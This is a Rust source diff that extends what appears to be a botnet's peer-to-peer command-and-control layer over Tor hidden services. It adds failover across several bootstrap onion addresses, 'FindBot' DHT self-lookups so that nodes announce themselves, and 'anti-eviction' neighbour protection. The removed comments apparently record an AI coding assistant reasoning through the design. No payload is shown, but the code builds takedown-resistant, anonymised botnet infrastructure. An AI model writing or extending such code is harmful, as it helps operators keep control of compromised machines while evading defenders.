@@ -65,10 +65,23 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
     }));
 
     // Register...
-    let bootstrap_onion = env!("BOOTSTRAP_ONION");
-    println!("Registering with Bootstrap: {}", bootstrap_onion);
-    if let Err(e) = register_via_tor(&tor_client, &state, bootstrap_onion, &my_pub_hex, &my_onion, &identity.keypair).await {
-         eprintln!("Bootstrap Registration Failed: {}", e);
+    use crate::common::constants::BOOTSTRAP_ONIONS;
+    println!("Registering with Bootstrap Swarm (Failover Mode)...");
+    
+    let mut bootstrap_success = false;
+    for onion_addr in BOOTSTRAP_ONIONS.iter() {
+        println!("Attempting Bootstrap: {}", onion_addr);
+        if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
+            println!("Bootstrap Success via {}", onion_addr);
+            bootstrap_success = true;
+            break;
+        } else {
+            eprintln!("Bootstrap Failed via {}. Creating failover...", onion_addr);
+        }
+    }
+    
+    if !bootstrap_success {
+        eprintln!("CRITICAL: All Bootstrap Nodes Unreachable.");
     }
 
     let state_clone = state.clone();
@@ -149,23 +162,42 @@ async fn handle_inbound_connection(
         Err(_) => return, // Connection handshake failed
     };
     
-    // Wrap in Arc<Mutex> for pooling?
-    // Inbound connections are usually short-lived or we can add them to pool if identified!
-    // But for simplicity of this request, we process messages.
-    // Ideally, if a neighbor connects, we should Identify (Handshake) and add to Pool.
-    // Current Protocol doesn't have explicit Handshake msg. we assume Gossip or Register.
-    // If Gossip: contains no Source Onion.
-    // So we treat inbound as Read-Only for now unless we upgrade protocol.
-    // Technical Report doesn't specify Reverse-Pooling without Handshake.
-    // We just process.
+    // Inbound Connection Handling
+    // If a neighbor connects, we process their messages.
+    // ActivePool will handle outbound reuse if we reply.
     
     while let Some(msg) = ws_stream.next().await {
         if let Ok(Message::Text(text)) = msg {
-            // Try Gossip
-            if let Ok(gossip) = serde_json::from_str::<GossipMsg>(&text) {
+            // V10 Protocol: Try to parse generic MeshMsg first
+            if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&text) {
+                match mesh_msg {
+                    MeshMsg::Gossip(gossip) => {
+                         handle_gossip(state.clone(), gossip, &tor).await;
+                    },
+                    MeshMsg::FindBot { target_id } => {
+                         // Reply with closest peers
+                         let closest = {
+                             let guard = state.read().await;
+                             guard.dht.get_closest_peers(&target_id, 5) // Return 5 neighbors
+                         };
+                         let resp = MeshMsg::FoundBot { nodes: closest };
+                         let resp_json = serde_json::to_string(&resp).unwrap_or_default();
+                         let _ = ws_stream.send(Message::Text(resp_json.into())).await;
+                    },
+                    MeshMsg::FoundBot { nodes } => {
+                        // Add to DHT
+                         let mut guard = state.write().await;
+                         for node in nodes {
+                             guard.dht.insert(node);
+                         }
+                    },
+                    _ => {} // Register/GetPeers handled by Bootstrap not Node
+                }
+            } 
+            // Fallback / Legacy (Direct GossipMsg)
+            else if let Ok(gossip) = serde_json::from_str::<GossipMsg>(&text) {
                  handle_gossip(state.clone(), gossip, &tor).await;
             }
-            // Try GetPeers/FindNode? (DHT Logic) - If implemented later.
         }
     }
 }
@@ -275,19 +307,17 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorC
         let msg_str = serde_json::to_string(&next_msg).unwrap();
         
         // Use ActivePool (Smart Send)
-        // We need write lock on pool BUT we are in async.
-        // We can't hold lock across await easily if pool is inside MeshState (RwLock).
-        // Solution: Clone the pool? Pool is in MeshState.
-        // We need to acquire write lock ON THE STATE to get mutable pool access?
-        // Or Pool should be checking internal mutexes.
-        // `MeshState.pool` -> `ActivePool`.
-        // `ActivePool` methods require `&mut self`.
-        // So we need `state.write().await`.
+        let mut guard = state.write().await;
         
-        let mut guard = state.write().await; 
+        // Anti-Eviction: Protect Neighbors
+        // We get ALL peers from DHT as "Neighbors" to protect.
+        // Collecting inside the lock is perfectly fine (Vec copy).
+        // Since we hold the lock, dht is accessible.
+        let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
+        
         for target_peer in selected {
-            // Smart Send
-            let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone()).await;
+            // Smart Send with Whitelist
+            let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone(), &neighbors).await;
         }
     }
 }
@@ -299,54 +329,19 @@ async fn perform_lookup(state: &Arc<RwLock<MeshState>>, tor: &TorClient<Preferre
         let guard = state.read().await;
         guard.dht.get_closest_peers(target_onion, 2)
     };
-    
-    // 2. Query them (via Gossip mechanism or new Message Type?)
-    // Report says: "Bot A hỏi Bot B: Ai ở gần A nhất?"
-    // This requires "FindNode" message type in Protocol.
-    // Current Protocol: Register, GetPeers, Peers, Gossip.
-    // "GetPeers" is currently "Give me generic peers".
-    // We can reuse `GetPeers` to mean "Find closest to me" if we are announcing ourselves?
-    // Or we stick to purely Gossip based announcement?
-    // Report: "A được ghim vào bản đồ mạng lưới của các hàng xóm mà không cần gói tin Broadcast".
-    // Implication: Just by contacting B, B adds A.
-    // So if A sends "GetPeers" to B, B sees A's ID?
-    // Current `GetPeers` message has NO payload.
-    // B doesn't know who A is unless we add Source Info.
-    // BUT B sees the *Connection*?
-    // Tor HIDDEN SERVICE connections are ANONYMOUS. B does NOT know A's address unless A sends it.
-    // So A MUST send "I am A".
-    // Refactoring Protocol to include Sender Info in `GetPeers`?
-    // Or just sending a "Ping" with payload.
-    
-    // STRICT ADHERENCE: I cannot change Protocol without breaking Ghost/Bootstrap?
-    // Only Node-to-Node protocol can change?
-    // `GetPeers` is used with Bootstrap too.
-    // I will use `Gossip` to simulate "I am here"?
-    // Or assume `ActivePool` handshake includes ID?
-    // `ActivePool` handshake is just `client_async`.
-    
-    // Compromise to avoid Protocol Breaking if not requested:
-    // I will assume `GetPeers` will eventually support Source Info.
-    // For now, I will skip the explicit "FindNode" RPC call logic and rely on "DHT maintenance via Gossip" or implied connection.
-    // Wait, report says "Bot A finds itself".
-    // This implies A sends a query for A.
-    // Peer B receives query for A. B adds A to routing table.
-    // B returns closest to A.
-    
-    // Since I cannot easily change Protocol Enum without updating Bootstrap logic (which I can do),
-    // and Protocol is shared.
-    // I will stick to Loop -> Send Gossip (Ping) to neighbors?
-    // Or better: Just ensure we check neighbors.
-    
-    // Actually, report says "Self-Lookup ... A được ghim".
-    // I will leave the lookup Logic skeleton here.
-    // Since I implemented `dht.rs`, I have `RoutingTable`.
-    // I will just iterate known peers and try to keep connections alive via ActivePool.
+    // "Bot A executes FIND_BOT(Target = My_ID)"
+    // We query alpha=2 closest peers to announce ourselves and maintain the DHT.
+    // This traffic keeps the circuits alive and updates neighbor routing tables.
     
     let mut guard = state.write().await;
-    let msg = "{}"; // Keepalive
+    let find_msg = MeshMsg::FindBot { target_id: target_onion.to_string() }; // V10: Find Myself
+    let msg_str = serde_json::to_string(&find_msg).unwrap(); // Use MeshMsg, not raw text
+    
+    // Anti-Eviction: Protect Neighbors
+    let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
+    
     for peer in closest {
-         let _ = guard.pool.send_msg(tor, &peer.onion_address, msg.to_string()).await;
+         let _ = guard.pool.send_msg(tor, &peer.onion_address, msg_str.clone(), &neighbors).await;
     }
 }
 
